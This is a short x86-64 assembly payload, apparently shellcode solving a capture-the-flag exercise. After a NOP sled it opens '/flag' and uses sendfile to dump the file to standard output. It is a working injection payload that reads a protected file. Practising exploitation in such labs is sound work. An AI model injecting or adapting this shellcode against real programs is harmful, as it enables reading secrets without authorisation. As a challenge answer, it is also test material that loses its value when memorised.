.global _start
_start:
.intel_syntax noprefix
.fill 0x800, 1, 0x90
        mov rax, 0x67616c662f
        mov [rdi], rax
        mov rsi, 0
        mov rdx, 0
        mov rax, 2
        syscall

        mov rdi, 1
        mov rsi, rax
        mov rax, 40
        mov rdx, 0
        mov r10, 0x100
        syscall

        mov rax, 60
        mov rdi, 0
        syscall